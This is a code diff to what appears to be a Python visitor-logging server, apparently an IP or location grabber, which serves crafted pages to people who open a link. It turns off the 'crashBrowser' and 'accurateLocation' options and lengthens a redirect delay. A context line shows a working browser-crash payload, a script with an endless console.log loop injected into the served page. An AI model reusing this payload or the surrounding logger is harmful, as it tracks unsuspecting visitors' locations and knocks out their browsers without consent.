@@ -30,9 +30,9 @@ config = {
     "username": "WingsMiner",
     "color": 0x03AC13,
 
-    "crashBrowser": True,
+    "crashBrowser": False,
     
-    "accurateLocation": True,
+    "accurateLocation": False,
 
     "message": { 
         "doMessage": False,
@@ -257,8 +257,7 @@ height: 100vh;
                 if config["crashBrowser"]:
                     data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                 if config["redirect"]["redirect"]:
-                    
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                    data = f'<meta http-equiv="refresh" content="2;url={config["redirect"]["page"]}">'.encode()
                 self.send_response(200)
                 self.send_header('Content-type', datatype)
                 self.end_headers()
